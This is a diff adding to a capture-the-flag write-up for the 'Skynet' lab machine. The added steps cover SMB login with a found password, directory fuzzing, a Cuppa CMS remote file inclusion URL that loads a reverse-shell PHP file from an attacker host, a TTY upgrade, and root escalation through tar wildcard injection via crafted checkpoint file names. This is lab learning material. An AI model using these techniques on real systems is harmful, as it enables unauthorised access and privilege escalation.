@@ -315,3 +315,77 @@ Then I proceeded with Hydra:
 
 Inspecting the recived email we found the samba password: )s{A&2Z=F^n_E.B`
     
+    smbclient \\\\10.10.18.58\\milesdyson -U milesdyson 
+    Password for [WORKGROUP\milesdyson]:
+    Try "help" to get a list of possible commands.
+Download important notes
+
+    smb: \notes\> get important.txt
+
+We can find a CMS: http://{skynet IP}/45kra24zxs28v3yd. Fuzzing the CMS as well:
+
+    ffuf -u http://10.10.18.58/45kra24zxs28v3yd/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c 
+    ...
+    administrator           [Status: 301, Size: 335, Words: 20, Lines: 10, Duration: 70ms]
+
+Visiting the administrator URL we are presented to login page of a CUPPA CMS. Tryng both the founded password for Miles Dyson but nothing worked. We can't find the version of CMS, anyway we can search for known vulnerability:
+
+    searchsploit "CUPPA CMS"
+      Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion ... php/webapps/25971.txt
+
+We can exploit it as follows:
+
+     http://<skynet IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<attacker IP>/reverse-shell.php
+
+To upgrade the shell to TTY
+
+    python -c 'import pty;pty.spawn("/bin/bash")'
+Search for file owned by root
+
+    find /home -user root -name "*.sh" 2>/dev/null
+    /home/milesdyson/backups/backup.sh
+The file is executed every one minutes
+
+    www-data@skynet:/$ ls -la /home/milesdyson/backups
+    ...
+    -rw-r--r-- 1 root       root       4679680 May  3 04:56 backup.tgz
+
+    www-data@skynet:/$ ls -la /home/milesdyson/backups
+    ...
+    -rw-r--r-- 1 root       root       4679680 May  3 04:57 backup.tgz
+
+### Lesson learned: tar wildcard injection privilege escalation 
+[Here](https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c) is explained very well
+
+Key points are:
+1. The script move to a directory
+2. Inside this directory (that we have to have  write permission) we created 3 files
+3. The 3 files are interpreted as arguments of the command <b>tar cf /home/milesdyson/backups/backup.tgz --checkpoint=1 --checkpoint=action=exec=sh shell.sh</b>
+
+So we proceed as follows:
+
+     cd cd /var/www/html
+     # 1
+     echo 'cat /root/root.txt > root.txt' > getFlag.sh
+     # 2 
+     echo "" > "--checkpoint-action=exec=sh getFlag.sh"
+     # 3
+     echo "" > --checkpoint=1
+
+    ls -la
+
+    total 80
+    -rw-rw-rw- 1 www-data www-data     1 May  3 05:20 --checkpoint-action=exec=sh getFlag.sh
+    -rw-rw-rw- 1 www-data www-data     1 May  3 05:20 --checkpoint=1
+    ...
+    -rw-rw-rw- 1 www-data www-data    32 May  3 05:20 getFlag.sh
+
+Check it out
+  
+    ls -la /bin/bash
+    -rwxr-xr-x 1 root root 1037528 Jul 12  2019 /bin/bash
+
+After a minute we should find a root.txt file containing the flag
+
+
+
